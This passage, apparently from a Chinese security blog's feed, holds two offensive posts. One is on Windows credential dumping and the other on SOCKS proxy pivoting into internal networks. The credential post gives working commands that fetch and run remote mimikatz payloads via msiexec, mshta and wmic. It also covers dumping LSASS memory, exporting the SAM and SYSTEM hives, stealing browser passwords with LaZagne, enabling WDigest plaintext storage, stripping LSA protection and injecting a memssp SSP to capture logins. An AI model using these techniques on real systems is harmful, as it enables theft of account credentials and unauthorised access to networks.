class="hljs-comment">//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><span class="hljs-built_in">$Content</span> = [System.Convert]::FromBase64String(<span class="hljs-built_in">$key</span>)<span class="hljs-keyword">Set</span>-Contentkey.snk -Value <span class="hljs-built_in">$Content</span> -EncodingByte</code></pre><p>​    </p><p>然后cmd执行</p><pre><code class="hljs latex">C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span>.NET<span class="hljs-tag">\<span class="hljs-name">Framework</span></span><span class="hljs-tag">\<span class="hljs-name">v</span></span>2.0.50727<span class="hljs-tag">\<span class="hljs-name">csc</span></span>.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.csC:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span>.NET<span class="hljs-tag">\<span class="hljs-name">Framework</span></span><span class="hljs-tag">\<span class="hljs-name">v</span></span>2.0.50727<span class="hljs-tag">\<span class="hljs-name">regsvcs</span></span>.exe katz.exe</code></pre><p>没复现成功。</p><h3 id="6-js加载mimikatz"><a href="#6-js加载mimikatz" class="headerlink" title="6.js加载mimikatz"></a>6.js加载mimikatz</h3><p>shell地址：<a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a></p><p>mimikatz.js：<a href="https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js">https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js</a></p><p>直接执行：<code>cscript mimikatz.js</code></p><p>但是已经过不了杀软，绕过方法参考：<a href="https://evi1cg.me/archives/AMSl_bypass.html">https://evi1cg.me/archives/AMSl_bypass.html</a></p><p>没有找到js文件</p><h3 id="7-msiexec加载mimikatz"><a href="#7-msiexec加载mimikatz" class="headerlink" title="7.msiexec加载mimikatz"></a>7.msiexec加载mimikatz</h3><p>mimikatz.mi：<a href="https://github.com/homjxi0e/PowerScript/blob/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi">https://github.com/homjxi0e/PowerScript/blob/master/Mimikatz.2.1.1/X64/Mimikatz%20x64.msi</a></p><p>远程执行</p><pre><code class="hljs awk">PS:&gt; msiexec.exe <span class="hljs-regexp">/passive /i</span> https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/homjxi0e/</span>PowerScript<span class="hljs-regexp">/raw/m</span>aster<span class="hljs-regexp">/Mimikatz.2.1.1/</span>X64<span class="hljs-regexp">/Mimikatz%20x64.msi /</span>norestartcmd:&gt; msiexec.exe <span class="hljs-regexp">/passive /i</span> https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/homjxi0e/</span>PowerScript<span class="hljs-regexp">/raw/m</span>aster<span class="hljs-regexp">/Mimikatz.2.1.1/</span>X64<span class="hljs-regexp">/Mimikatz%20x64.msi /</span>norestart</code></pre><p>cmd执行</p><pre><code class="hljs latex">msiexec /passive /i C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">Administrator</span></span><span class="hljs-tag">\<span class="hljs-name">Downloads</span></span><span class="hljs-tag">\<span class="hljs-name">Mimikatz</span></span>.msi</code></pre><p>没有找到msi文件</p><h3 id="8-NET4-0加载mimikatz"><a href="#8-NET4-0加载mimikatz" class="headerlink" title="8..NET4.0加载mimikatz"></a>8..NET4.0加载mimikatz</h3><p>mimikatz.xml：<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml</a></p><p>cmd执行</p><pre><code class="hljs css"><span class="hljs-selector-tag">cd</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Windows</span>\<span class="hljs-selector-tag">Microsoft</span><span class="hljs-selector-class">.NET</span>\<span class="hljs-selector-tag">Framework64</span>\<span class="hljs-selector-tag">v4</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.30319</span><span class="hljs-selector-tag">msbuild</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">mimikatz</span><span class="hljs-selector-class">.xml</span></code></pre><p>加载mimikatz成功</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201142952835.png" alt="image-20210201142952835"></p><h3 id="9-xsl加载mimikatz"><a href="#9-xsl加载mimikatz" class="headerlink" title="9.xsl加载mimikatz"></a>9.xsl加载mimikatz</h3><p>mimikatz.xsl:<a href="https://gist.githubusercontent.com/manasmbellani/7f3e39170f5bc8e3a493c62b80e69427/raw/87550d0fc03023bab99ad83ced657b9ef272a3b2/mimikatz.xsl">https://gist.githubusercontent.com/manasmbellani/7f3e39170f5bc8e3a493c62b80e69427/raw/87550d0fc03023bab99ad83ced657b9ef272a3b2/mimikatz.xsl</a></p><p>本地执行：<code>wmic os get /format:&quot;mimikatz.xsl&quot;</code></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201143133124.png" alt="image-20210201143133124"></p><p>远程加载：<code>wmic os get /format:&quot;http://127.0.0.1/mimikatz.xsl&quot;</code></p><h3 id="10-sct加载mimikatz"><a href="#10-sct加载mimikatz" class="headerlink" title="10.sct加载mimikatz"></a>10.sct加载mimikatz</h3><p>mimikatz.sct：https:/gist.github.com/caseysmithrc/3fe7a8330a74b303562eb494d47e79c5/raw/9336891fc81ac71bfff3c8fd4a8816dead30964e/mimikatz.sct</p><p>cmd执行</p><pre><code class="hljs awk">mshta.exe javascript:a=GetObject(<span class="hljs-string">&quot;script:https://gist.github.com/caseysmithrc/3fe7a8330a74b303562eb494d47e79c5/raw/9336891fc81ac71bfff3c8fd4a8816dead30964e/mimikatz.sct&quot;</span>).Exec(); log coffee <span class="hljs-keyword">exit</span></code></pre><p>没有找到sct文件</p><h2 id="2-windows下常见的抓取hash工具"><a href="#2-windows下常见的抓取hash工具" class="headerlink" title="2..windows下常见的抓取hash工具"></a>2..windows下常见的抓取hash工具</h2><p>工具下载： <a href="https://github.com/TheKingOfDuck/hashdump">https://github.com/TheKingOfDuck/hashdump</a></p><h3 id="1-QuarksPwDump"><a href="#1-QuarksPwDump" class="headerlink" title="1.QuarksPwDump"></a>1.QuarksPwDump</h3><p>直接在cmd下启动程序，会显示出所支持的用法</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131195407858.png" alt="image-20210131195407858"></p><p>执行<code>QuarksPwDump.exe -dha</code></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131195708977.png" alt="image-20210131195708977"></p><h3 id="2-wce"><a href="#2-wce" class="headerlink" title="2.wce"></a>2.wce</h3><p>执行<code>wce.exe -w</code></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131204114432.png" alt="image-20210131204114432"></p><h3 id="3-pwdump7"><a href="#3-pwdump7" class="headerlink" title="3.pwdump7"></a>3.pwdump7</h3><p>有一个依赖文件，经常报错，不推荐</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131204415490.png" alt="image-20210131204415490"></p><p>将抓取到的hash解ntlm</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131204448558.png" alt="image-20210131204448558"></p><h3 id="4-LaZagne"><a href="#4-LaZagne" class="headerlink" title="4.LaZagne"></a>4.LaZagne</h3><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p><p>支持浏览器、数据库等等很多，但是由python编写，文件比较大</p><p>获取所有密码：<code>laZagne.exe all</code></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131210014659.png" alt="image-20210131210014659"></p><p>只获取浏览器记住的密码：<code>laZagne.exe browsers</code></p><p>只获取firefox记住的密码：<code>laZagne.exe browsers -firefox</code></p><p>将输出保存到文件：<code>laZagne.exe all -oN</code></p><p>执行完该命令后会发现当前目录下多了一个文件，文件名类似：<code>credentials_23042019_225124.txt</code></p><p>还可以加参数-output指定输出到哪个目录，如：<code>laZagne.exe all -quiet -oA -output C:\Users\Werner\Desktop</code></p><p>若是知道用户密码，可以用参数-password输入，这样就可能解密出更多明文密码，如：<code>laZagne.exe all -password P@5sw0rd</code></p><h3 id="5-sharpdump"><a href="#5-sharpdump" class="headerlink" title="5.sharpdump"></a>5.sharpdump</h3><p><a href="https://github.com/GhostPack/SharpDump">https://github.com/GhostPack/SharpDump</a></p><p>转储LSASS：</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131212129367.png" alt="image-20210131212129367"></p><p>在结果中给出了一种结合mimikatz的用法，但是需要手都转储lsass进程</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131220949255.png" alt="image-20210131220949255"></p><p>将转储文件拿出来用mimikatz解出密码，在mimikatz中依次执行以下命令</p><pre><code class="hljs css"><span class="hljs-selector-tag">sekurlsa</span><span class="hljs-selector-pseudo">::minidump</span> <span class="hljs-selector-tag">lsass</span><span class="hljs-selector-class">.DMP</span><span class="hljs-selector-tag">sekurlsa</span><span class="hljs-selector-pseudo">::logonpasswords</span> <span class="hljs-selector-tag">full</span></code></pre><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131221357423.png" alt="image-20210131221357423"></p><p>另外一种用法转储特定的进程ID：<code>SharpDump.exe 8700</code></p><h3 id="6-procdump"><a href="#6-procdump" class="headerlink" title="6.procdump"></a>6.procdump</h3><p>cmd下执行：<code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210131221744431.png" alt="image-20210131221744431"></p><p>这款工具也是直接dump下lsass进程，后续解密和sharpdump解密一样放在mimikatz中</p><h3 id="7-sqldumper"><a href="#7-sqldumper" class="headerlink" title="7.sqldumper"></a>7.sqldumper</h3><p>微软自己家的东西,如果目标安装了mssql，可以通过sqldumper.exe来dump lsass进程，没安装也可以手动上传。 sqldumper的默认路径：C:\Program Files\Microsoft SQL Server\110\Shared</p><p>cmd下执行：<code>for /f &quot;tokens=2&quot; %i in(&#39;tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; .NH&#39;) do sqldumper.exe %i 0 0x01100</code></p><p>这种方法没做出来，不过可以分开来</p><p>1.先找到lsass.exe的进程id:<code>tasklist|findstr &quot;lsass.exe&quot;</code></p><p>2.导出dmp文件：<code>sqldumper.exe &lt;pid&gt; 0 0x01100</code></p><p>也报错，你妈的佛了。。。</p><h3 id="8-rundll32"><a href="#8-rundll32" class="headerlink" title="8.rundll32"></a>8.rundll32</h3><p>微软自己家的东西</p><p>cmd下执行：<code>for /f &quot;tokens=2&quot; %i in(&#39;tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; .NH&#39;) do rundall32.exe C:\windows\System32\comsvcs.dll MiniDump %i .\lsass.dmp full</code></p><p> 报错。。。</p><h3 id="9-SAM数据库"><a href="#9-SAM数据库" class="headerlink" title="9.SAM数据库"></a>9.SAM数据库</h3><p>sam文件：是用来存储本地用户账号密码的文件的数据库<br>system文件：里面有对sam文件进行加密和加密的密钥</p><p><strong>原理</strong></p><p>读取<code>HKLM\SYSTEM</code>，获得<code>syskey</code>：</p><p>syskey的由来： 读取注册表项<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的键值<code>JD</code>、<code>Skew1</code>、<code>GBG</code>和<code>Data</code>中的内容，拼接成<code>syskey</code></p><p>syskey的作用：Syskey中的加密的是账号数据库，也就是位于<code>%SystemRoot%\system32\config</code>的SAM文件</p><p>简单的说，导出sam和system文件，利用mimikatz解密</p><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> hklm\sam sam.hivreg <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> <span class="hljs-built_in">system</span>.hivlsadump::sam /sam:sam.hiv /<span class="hljs-built_in">system</span>:<span class="hljs-built_in">system</span>.hiv</code></pre><h2 id="3-常见的服务密码抓取"><a href="#3-常见的服务密码抓取" class="headerlink" title="3.常见的服务密码抓取"></a>3.常见的服务密码抓取</h2><h4 id="1-Navicat"><a href="#1-Navicat" class="headerlink" title="1.Navicat"></a>1.Navicat</h4><p>工具地址：<a href="https://github.com/HyperSine/how-does-navicat-encrypt-password">https://github.com/HyperSine/how-does-navicat-encrypt-password</a></p><p>Navicat是由PremiumSoft CyberTech Ltd.为MySQL，MariaDB，Oracle，SQLite，PostgreSQL和Microsoft SQL Server生产的一系列图形数据库管理和开发软件。它具有类似Explorer的图形用户界面，并支持本地和远程数据库的多个数据库连接。它的设计旨在满足从数据库管理员和程序员到为客户提供服务并与合作伙伴共享信息的各种企业/公司的各种受众的需求。</p><p>当选择保存密码后，navicat会将这些信息加密后保存在注册表中</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201022223153.png" alt="image-20210201022223153"></p><p>将工具集成到cs后，反弹一个会话</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201022600111.png" alt="image-20210201022600111"></p><p>执行之后，会自己抓取</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201022627585.png" alt="image-20210201022627585"></p><p>若目标未安装navicat，会提示</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201022644110.png" alt="image-20210201022644110"></p><h4 id="2-lazage抓取浏览器密码"><a href="#2-lazage抓取浏览器密码" class="headerlink" title="2.lazage抓取浏览器密码"></a>2.lazage抓取浏览器密码</h4><p>目标及执行：<code>lazagne.exe broswers</code> 会尝试抓取浏览器存储的密码，参考上面。</p><h4 id="3-sharpdecryptpwd"><a href="#3-sharpdecryptpwd" class="headerlink" title="3.sharpdecryptpwd"></a>3.sharpdecryptpwd</h4><p>可以抓取navicat、sql server management studio、X manager–&gt;xshell、xftp、 Teamview、Filezile、winscp的密码</p><h4 id="4-数据库密码抓取"><a href="#4-数据库密码抓取" class="headerlink" title="4.数据库密码抓取"></a>4.数据库密码抓取</h4><p>查看配置文件，端口转发连接到数据库</p><h2 id="4-密码抓取绕过（win10及2012版本之后）"><a href="#4-密码抓取绕过（win10及2012版本之后）" class="headerlink" title="4.密码抓取绕过（win10及2012版本之后）"></a>4.密码抓取绕过（win10及2012版本之后）</h2><h3 id="1-2012操作系统之后的绕过抓取"><a href="#1-2012操作系统之后的绕过抓取" class="headerlink" title="1.2012操作系统之后的绕过抓取"></a>1.2012操作系统之后的绕过抓取</h3><p>直接用mimikatz抓取的密码会显示null</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201005404128.png" alt="image-20210201005404128"></p><p>绕过方式</p><h4 id="1-操作注册表"><a href="#1-操作注册表" class="headerlink" title="1.操作注册表"></a>1.操作注册表</h4><h5 id="1-修改注册表键值"><a href="#1-修改注册表键值" class="headerlink" title="1.修改注册表键值"></a>1.修改注册表键值</h5><p>通过修改注册表，当键值=1时，Wdigest Auth保存明文口令，为0则不保存明文，再次登录生效</p><p>执行以下命令修改·注册表键值：</p><pre><code class="hljs latex">reg add HKLM<span class="hljs-tag">\<span class="hljs-name">SYSTEM</span></span><span class="hljs-tag">\<span class="hljs-name">CurrentControlSet</span></span><span class="hljs-tag">\<span class="hljs-name">Control</span></span><span class="hljs-tag">\<span class="hljs-name">SecurityProviders</span></span><span class="hljs-tag">\<span class="hljs-name">WDigest</span></span> /v UseLogonCredential /t REG_DWORD /d 1 /f</code></pre><p>关闭</p><pre><code class="hljs awk">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest <span class="hljs-regexp">/v UseLogonCredential /</span>t REG_DWORD <span class="hljs-regexp">/d 0 /</span>f</code></pre><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201010138632.png" alt="image-20210201010138632"></p><p>执行以下命令模拟用户锁屏：<code>rundll32.exe user32.dll,LockWorkStation</code></p><p>重新登陆以后在使用mimikatz进行抓取密码</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201010536492.png" alt="image-20210201010536492"></p><h5 id="2-保存注册表"><a href="#2-保存注册表" class="headerlink" title="2.保存注册表"></a>2.保存注册表</h5><p>使用注册表导出Hash，再通过impacket进行离线读取</p><pre><code class="hljs css"><span class="hljs-selector-tag">reg</span> <span class="hljs-selector-tag">save</span> <span class="hljs-selector-tag">HKLM</span>\<span class="hljs-selector-tag">SYSTEM</span> <span class="hljs-selector-tag">sys</span><span class="hljs-selector-class">.hiv</span><span class="hljs-selector-tag">reg</span> <span class="hljs-selector-tag">save</span> <span class="hljs-selector-tag">HKLM</span>\<span class="hljs-selector-tag">SAM</span> <span class="hljs-selector-tag">sam</span><span class="hljs-selector-class">.hiv</span><span class="hljs-selector-tag">reg</span> <span class="hljs-selector-tag">save</span> <span class="hljs-selector-tag">hklm</span>\<span class="hljs-selector-tag">security</span> <span class="hljs-selector-tag">security</span><span class="hljs-selector-class">.hiv</span><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">secretsdump</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-sam</span> <span class="hljs-selector-tag">sam</span><span class="hljs-selector-class">.hiv</span> <span class="hljs-selector-tag">-security</span> <span class="hljs-selector-tag">security</span><span class="hljs-selector-class">.hiv</span> <span class="hljs-selector-tag">-system</span> <span class="hljs-selector-tag">sys</span><span class="hljs-selector-class">.hiv</span> <span class="hljs-selector-tag">LOCAL</span></code></pre><h4 id="2-绕过kb2871997"><a href="#2-绕过kb2871997" class="headerlink" title="2.绕过kb2871997"></a>2.绕过kb2871997</h4><p>这个补丁的作用是防止攻击者抓取明文密码，绕过方式如下。</p><p>脚本地址： <a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed">https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed</a></p><p>使用之前需要在c盘新建一个<code>test/pwd.txt</code>文件</p><p>执行以下命令会注销掉操作系统，让用户重新登录</p><pre><code class="hljs css"><span class="hljs-selector-tag">PowerShell</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-ExecutionPolicy</span> <span class="hljs-selector-tag">Bypass</span> <span class="hljs-selector-tag">-File</span> <span class="hljs-selector-tag">dump</span><span class="hljs-selector-class">.ps1</span></code></pre><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201013650065.png" alt="image-20210201013650065"></p><h4 id="3-protected-users"><a href="#3-protected-users" class="headerlink" title="3.protected users"></a>3.protected users</h4><p>受保护用户是一个新的域全局安全组，对于该组的成员，windows 8.1设备或Windows Server2012 R2主机不会缓存受保护用户不支持的凭据。如果这些组的成员登录到运行早于Windows8.1的Windows版本的设备，则该组的成员没有其他保护。登录到Windows 8.1设备和Windows Server 2012 R2主机的受保护用户组的成员不能再使用:</p><p>1.默认凭据委派(CredssP )-即使启用了”允许委派默认凭据”策略，也不会缓存纯文本凭据</p><p>2.windows摘要–即使启用明文凭掘也不会进行缓存</p><p>3.NTLM - NTOWF未媛存</p><p>4.Kerberos长期密钥-Kerberos票证授予票证(TGT)在登录时获取，无法自动重新获取</p><p>5.离线登录-未创建缓存的登录验证程序</p><p>如果域功能级别是Windows Server 2012 R2，则该组的成员不能再:</p><p>1.使用NTLM身份验证进行身份验证</p><p>2.在Kerberos预身份验证中使用数掘加密标准(DES )或RC4密码套件。</p><p>3.通过使用无约束或约束委派来委派</p><p>4.更新用户票证(TGT)超过最初的4小时生命周期</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201014317852.png" alt="image-20210201014317852"></p><p>如果此时直接使用mimikatz的<code>SEKURLSA::LogonPasswords</code>抓取会出现乱码</p><p>绕过方式：使用：<code>sekurlsa::ekeys</code></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201015323031.png" alt="image-20210201015323031"></p><h4 id="4-Additional-LSA-Protection"><a href="#4-Additional-LSA-Protection" class="headerlink" title="4.Additional LSA Protection"></a>4.Additional LSA Protection</h4><p>LSA(包括本地安全机构服务器服务(LSASS )进程）验证用户是否进行本地和远程登录，并实施本地安全策略。Windows 8.1操作系统为LSA提供额外保护，以防止未受保护的进程读取内存和代码注入。启用此功能后无法把debugger attach到进程上。在win8.1及2012 r2以上有效。</p><p><strong>启用lsa</strong></p><p>注册表位置：</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201020736802.png" alt="image-20210201020736802"></p><p>新建-DWORD（32）值，名称为 RunAsPPL,数值为 00000001，重启系统生效。</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201020807752.png" alt="image-20210201020807752"></p><p>在配置了lsa后，执行<code>misc::skeleton</code>会报错</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201020921648.png" alt="image-20210201020921648"></p><p><strong>绕过</strong></p><p>mimikatz首先加载驱动：<code>!+</code></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201020048564.png" alt="image-20210201020048564"></p><p>然后先执行：<code>!processprotect /process:lsass.exe /remove</code></p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201020344130.png" alt="image-20210201020344130"></p><p>验证<code>misc::skeleton</code>（可省略）</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201021117290.png" alt="image-20210201021117290"></p><p>再使用<code>SEKURLSA::LogonPasswords</code>抓取明文密码</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201020413865.png" alt="image-20210201020413865"></p><h4 id="5-Credentials-Guard"><a href="#5-Credentials-Guard" class="headerlink" title="5.Credentials Guard"></a>5.Credentials Guard</h4><p>credentials Guard是win10中引入的新功能，据称能保护NTLM密码哈希值，Kerberos票证授予票证和应用程序存储的凭据。该进程是唯一能使用明文凭据的进程，它的原理大概是这样:当NTLM认证过程中需要用到例如ntlm hash这类凭证的时候（第三步)，将Credentials Guard视为黑箱，由lsass等进程输入生成NetNTLM所需的信息（第二步收到的challenge等等)，由CG处理并输出结果，而CG本身内存禁止读取，使得mimikatz这一类工具无从下手:</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201021304852.png" alt="image-20210201021304852"></p><p><strong>绕过方式</strong></p><p>memssp SSP的二进制形式是DLL，提供用来处理身份认证的接口(SSPI)。如果我们无法从内存中直接获取凭据，那么通过注册一个ssp来处理用户登录时输入的凭据也是一种办法。mimikatz直接在内存中加栽自定义的ssp dll，能够在用户登录时获取到明文凭据.</p><p>mimikatz内存注入sSp</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201021702029.png" alt="image-20210201021702029"></p><p>等待用户再次登录。登录后可以在<code>c:/windows/system32/mimilsa.log</code>下查看明文密码</p><p><img src="/2020/10/08/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20210201022028114.png" alt="image-20210201022028114"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rundll32</tag>
      
      <tag>加载mimikatz的10种姿势</tag>
      
      <tag>QuarksPwDump</tag>
      
      <tag>wce</tag>
      
      <tag>pwdump7</tag>
      
      <tag>LaZagne</tag>
      
      <tag>sharpdump</tag>
      
      <tag>procdump</tag>
      
      <tag>sqldumper</tag>
      
      <tag>SAM数据库</tag>
      
      <tag>Navicat</tag>
      
      <tag>sharpdecryptpwd</tag>
      
      <tag>数据库密码抓取</tag>
      
      <tag>win10及2012之后密码抓取绕过五种姿势</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络代理</title>
    <link href="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/"/>
    <url>/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>本文介绍4种常见的网络协议代理以及进行代理的常用工具。</p><a id="more"></a><p>代理相当于将内网撕开一个口子将攻击机放进内网。</p><p>攻击机：kali：192.168.43.30</p><p>客户机：win7：192.168.43.78</p><p>客户机1：win2k8：192.168.43.127</p><h2 id="1-socks代理"><a href="#1-socks代理" class="headerlink" title="1.socks代理"></a>1.socks代理</h2><h3 id="1-cs"><a href="#1-cs" class="headerlink" title="1.cs"></a>1.cs</h3><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210130234119079.png" alt="image-20210130234119079"></p><p>选择监听端口</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210130234136948.png" alt="image-20210130234136948"></p><h3 id="2-msf"><a href="#2-msf" class="headerlink" title="2.msf"></a>2.msf</h3><p>msf生成攻击载荷在客户机，开启监听得到一个session，然后使用<code>run post/multi/manage/autoroute</code>模块在客户机和攻击机之间添加一个路由</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131004437697.png" alt="image-20210131004437697"></p><p><code>run autoroute -p</code>查看路由</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131004506634.png" alt="image-20210131004506634"></p><p><code> use  auxiliary/server/socks_proxy</code>开启socks代理</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131005020117.png" alt="image-20210131005020117"></p><p>exploit执行，jobs查看任务</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131005045576.png" alt="image-20210131005045576"></p><p>此socks相当于一个vpn需要自己连接才能使用，此时需要借助proxychains代理链来调用socks代理</p><p>编辑代理链的文件/etc/proxychains.conf设置代理，设置socks</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210131005345851.png" alt="image-20210131005345851"></p><p>此时使用proxychains连接客户机所在内网的任何一台机器都OK</p><h3 id="3-ew"><a href="#3-ew" class="headerlink" title="3.ew"></a>3.ew</h3><h4 id="1-正向代理"><a href="#1-正向代理" class="headerlink" title="1.正向代理"></a>1.正向代理</h4><p>在客户机1上开启socks服务监听指定端口：<code>ew_win32.exe -s ssocksd -l 1080</code> （-s：指定协议，-l:指定端口）</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205163217525.png" alt="image-20210205163217525"></p><p>由于攻击机和客户机IP不一样，所以需要改变攻击机代理链配置文件</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205164144197.png" alt="image-20210205164144197"></p><p>连接客户机1即可：<code>proxychains rdesktop 192.168.43.127</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205163455839.png" alt="image-20210205163455839"></p><p>本次实验win7也能成功。</p><h4 id="2-反向代理"><a href="#2-反向代理" class="headerlink" title="2.反向代理"></a>2.反向代理</h4><p>在客户机开启一个socks代理，把本地的流量从port1转发到port2端口：<code>ew_win32.exe -s rcsocks -l port1 -e port2</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205170622445.png" alt="image-20210205170622445"></p><p>在客户机1开启一个socks代理把本地的流量转发到客户机的port2上：<code>ew_win32.exe -s rssocks -d host1 -e port2</code></p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205170632277.png" alt="image-20210205170632277"></p><p>编辑代理链的文件/etc/proxychains.conf设置代理，设置socks为客户机</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205170718271.png" alt="image-20210205170718271"></p><p>连接客户机1即可</p><p><img src="/2020/10/07/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/image-20210205170757366.png" 